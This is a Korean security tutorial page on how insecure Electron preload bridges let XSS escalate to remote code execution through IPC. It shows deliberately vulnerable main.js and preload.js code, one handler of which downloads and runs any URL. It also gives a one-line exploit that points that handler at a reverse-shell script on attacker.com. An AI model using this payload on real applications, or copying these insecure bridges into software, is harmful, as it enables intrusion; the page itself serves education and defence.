# Electron contextIsolation을 통한 IPC RCE

{{#include ../../banners/hacktricks-training.md}}

context isolation은 안전하지 않은 preload bridge를 안전하게 만들어 주지 않습니다. preload가 renderer 콘텐츠에 권한이 있는 IPC를 노출하면 XSS 또는 침해된 renderer가 해당 bridge를 호출할 수 있습니다. 이후 RCE 가능성은 해당 main-process handler의 검증 및 권한에 따라 달라집니다. Electron은 각 작업마다 범위가 좁은 메서드 하나만 노출하고, IPC sender를 검증하며, raw IPC primitive를 절대 노출하지 않을 것을 권장합니다.<sup>[[3]](#references)[[4]](#references)</sup>

**이 예시 대부분은 여기에서 가져왔습니다** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). 더 자세한 내용은 동영상을 확인하세요.<sup>[[1]](#references)</sup>

## 예시 0

[https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21)의 예시입니다 (해당 슬라이드에는 MS Teams에서 XSS를 이용해 RCE까지 이어진 전체 사례가 담겨 있습니다. 아래는 아주 기본적인 예시일 뿐입니다):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 예시 1

`main.js`가 `getUpdate`를 수신하고 전달된 **모든 URL을 다운로드해 실행**하는지 확인하세요.\
또한 `preload.js`가 main의 **모든 IPC 이벤트를 노출**하는지도 확인하세요.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Example 2

preload에서 scheme 및 destination 검증 없이 `shell.openExternal`을 노출하면, renderer가 제어하는 입력으로 등록된 외부 핸들러를 실행할 수 있습니다. 이것이 code execution으로 이어지는지는 플랫폼, 설치된 핸들러, scheme 및 Electron 버전에 따라 다릅니다. 예상되는 `https:` destination만 명시적 allowlist에 포함하도록 제한하세요.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## 예시 3

preload가 main process와의 제한 없는 통신을 노출한다면, XSS로 임의의 채널 이름과 데이터를 보낼 수 있습니다. 영향은 등록된 IPC 핸들러와 해당 핸들러의 권한 검사에 따라 달라집니다.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [XSS와 RCE를 이용한 최신 데스크톱 앱 해킹 워크숍](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [내가 Microsoft Teams를 해킹해 Pwn2Own에서 $150,000를 받은 방법](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — 보안 체크리스트](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — 컨텍스트 격리 및 안전한 API 노출](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
